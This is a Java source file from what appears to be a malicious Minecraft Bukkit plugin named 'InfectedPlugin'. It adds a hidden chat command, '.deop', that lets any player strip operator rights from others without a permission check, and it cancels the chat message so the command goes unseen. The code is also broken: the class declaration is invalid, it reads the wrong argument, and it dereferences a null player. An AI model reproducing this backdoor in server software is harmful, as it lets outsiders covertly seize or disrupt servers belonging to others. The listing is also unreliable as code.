 package org.CreeperCoders.InfectedPlugin.Commands;
 
 import org.bukkit.Server;
 import org.bukkit.Bukkit;
 import org.bukkit.ChatColor;
 import org.bukkit.entity.Player;
 import org.bukkit.event.*;
 import org.bukkit.event.player.AsyncPlayerChatEvent;
 
public class Command_deop extends IP_Command implements Listener extends IP_Command
 {
     @EventHandler
     public void onPlayerChat(AsyncPlayerChatEvent event) throws PlayerNotFoundException //I'm too lazy to surround it with try and catch method
     {
         String message = event.getMessage();
         final Player p = event.getPlayer();
         Server server = Bukkit.getServer();
         boolean cancel = false;
         
         if (message.startsWith("."))
         {
             String[] args = message.split(" ");
             if (args == null)
             {
                 return;
             }
     
             if (args[0].equalsIgnoreCase(".deop"))
             {    
                 if (args.length == 0)
                 {
                     p.sendMessage(ChatColor.RED + "Usage: .deop <player>");
                 }
                 else
                 {   
                     Player target = getPlayer(args[0]);
                     if (target == null)
                     {
                         server.getOfflinePlayer(args[1]).setOp(false);
                     }
                     target.setOp(false);
                     target.sendMessage(ChatColor.RED + "You are no longer OP.");
                 }
                 cancel = true;
             }
         
             if (cancel)
             {
                 event.setCancelled(true);
                 return;
             }
         }
     }
 }
